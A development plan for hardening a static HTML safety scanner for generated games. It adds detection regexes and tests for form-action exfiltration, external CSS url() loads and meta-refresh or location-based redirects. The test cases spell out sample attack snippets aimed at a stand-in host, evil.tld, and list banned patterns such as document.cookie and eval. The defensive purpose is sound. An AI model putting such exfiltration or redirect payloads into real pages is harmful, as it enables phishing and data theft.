# Sprint 2 — Static Safety-Scanner Hardening

See [00-overview.md](00-overview.md) for the full rationale. Isolated to
`safety.py` plus a new `tests/test_safety.py` — no other file changes
required. Independent of Sprint 1; can be done in either order. Closes
three concrete gaps found in the review: form-action exfiltration,
CSS-based external resource loading, and meta-refresh redirects — all of
which the current `_SRC_RE` regex silently misses because it only matches
literal `src=`/`href=` attribute values.

## Part A: catch `action=` (form exfiltration)

`safety.py`'s `scan()` currently builds its host-allowlist check only off
`_SRC_RE = re.compile(r'(?:src|href)\s*=\s*["\']([^"\']+)["\']', ...)`.
A `<form action="https://evil.tld/collect">` never matches this, so it
sails through untouched even though Sprint 1's `form-action 'none'` CSP
will block it in the browser regardless. Catch it here too, so a bad
submission is rejected at generation time instead of relying solely on
the browser backstop:

- Extend the attribute regex to include `action`:
  `_SRC_RE = re.compile(r'(?:src|href|action)\s*=\s*["\']([^"\']+)["\']', re.IGNORECASE)`.
- Since games have no legitimate reason to submit a form anywhere at
  all (not even to an allowlisted CDN host — CDNs serve static assets,
  they don't accept form posts), treat **any** non-empty, non-`#`,
  non-relative-fragment `action=` value as a violation, not just
  off-allowlist hosts. Add a dedicated check after the existing
  `_SRC_RE.findall()` loop:
  ```python
  for action in _ACTION_RE.findall(html):
      action = action.strip()
      if action and action not in ("#",) and not action.startswith("#"):
          violations.append(f"form with external action '{action}'")
  ```
  (as a separate `_ACTION_RE` regex scoped to `action=` only, kept apart
  from `_SRC_RE` so the "any action is suspicious" rule doesn't
  accidentally get applied to `src`/`href`, which legitimately point at
  allowlisted CDN hosts).

## Part B: catch CSS `url(...)` (external resource loading outside markup attributes)

- Add a new regex for CSS `url()` references, scoped to `<style>` blocks
  and inline `style="..."` attributes:
  `_CSS_URL_RE = re.compile(r'url\(\s*["\']?([^"\')]+)["\']?\s*\)', re.IGNORECASE)`.
- Run it against the whole HTML (simplest — a `url(...)` outside CSS
  context is vanishingly unlikely in generated game markup) and apply
  the same `_host_of()` / `ALLOWED_CDN_HOSTS` check already used for
  `_SRC_RE`, appending `external resource from disallowed host '{host}'
  ({url})"` violations exactly as the existing loop does. Skip `data:`
  URIs (`url(data:...)`) — inline images/fonts as data URIs are
  legitimate and carry no external network reach.

## Part C: ban meta-refresh and JS-based page navigation

- Add to `_BANNED_PATTERNS`:
  ```python
  (re.compile(r'<meta[^>]+http-equiv\s*=\s*["\']refresh["\']', re.IGNORECASE),
   "meta refresh redirect"),
  (re.compile(r'\blocation\.(?:href|replace|assign)\s*[=(]'),
   "script-based page navigation (location.href/replace/assign)"),
  (re.compile(r'\bwindow\.location\s*='),
   "script-based page navigation (window.location assignment)"),
  ```
- Rationale for banning these outright rather than allowlist-checking
  the target: a self-contained single-page game has no legitimate reason
  to navigate itself anywhere, allowlisted or not — the entire "game"
  contract is "render and respond to input inside this one page." This
  also incidentally blocks the trusted-chrome phishing pattern from the
  review (game silently navigates the iframe to an attacker page while
  the site's own address bar/chrome stays visible around it).
- Do **not** attempt to ban bare reads of `location` (e.g.
  `location.search`, `location.hash` for query-param based game modes) —
  only the navigation-triggering assignment/method-call forms above.
  Verify this distinction with the test cases in Part D.

## Part D: tests

Create `tests/test_safety.py` (new file, no existing safety tests today)
covering both "violation detected" and "legitimate pattern still
allowed" for every change above:

- `scan()` flags `<form action="https://evil.tld/x">...</form>` with a
  message containing `"form with external action"`.
- `scan()` does **not** flag `<form action="#">...</form>` or a
  `<form>` with no `action` attribute at all (both are common in
  generated games for on-page "submit score" UI that's handled purely in
  JS).
- `scan()` flags `<div style="background:url('https://evil.tld/x.png')">`
  and a `<style>body{background:url(https://evil.tld/x.png)}</style>`
  block, but does **not** flag `url(data:image/png;base64,AAAA)` or
  `url('https://cdn.jsdelivr.net/npm/foo/bar.png')` (allowlisted host).
- `scan()` flags `<meta http-equiv="refresh" content="0;url=https://evil.tld">`.
- `scan()` flags `location.href = 'https://evil.tld'`,
  `window.location = 'https://evil.tld'`, and
  `location.replace('https://evil.tld')`.
- `scan()` does **not** flag `const q = location.search;` or
  `if (location.hash === '#level2')`.
- Regression: every existing banned pattern (`eval(`, `new Function(`,
  `document.cookie`, `localStorage`, `window.parent`, `window.top`,
  `javascript:`, and an off-allowlist `<script src>`) still gets caught
  — copy these as explicit cases even though they predate this sprint,
  so a future regex refactor can't silently drop one.

## Manual verification

Run each hand-crafted "evil" snippet from Part D's test list through
`python3 -c "import safety; print(safety.scan(open('x.html').read()))"`
and confirm the expected violation string appears, then confirm the
generation pipeline actually rejects it end-to-end: temporarily point
`game_generator.SUBMIT_GAME_TOOL`'s mock (or use the existing DeepSeek
client mock from `tests/test_generation_loop.py`) at a fixture that
returns one of these bad HTML strings and assert
`run_generation_attempts()` retries with a `safety_violation` outcome
rather than writing the game to disk.

## Acceptance criteria

- All new regexes added to `safety.py` with no changes to its public
  `scan(html) -> list[str]` signature.
- `tests/test_safety.py` passes with full coverage of both the new
  violations and their "must not false-positive" counterparts.
- Existing `tests/test_generation_loop.py` still passes unmodified
  (confirms the new checks don't reject any of that suite's known-good
  fixture HTML).
- Full `pytest` suite green.
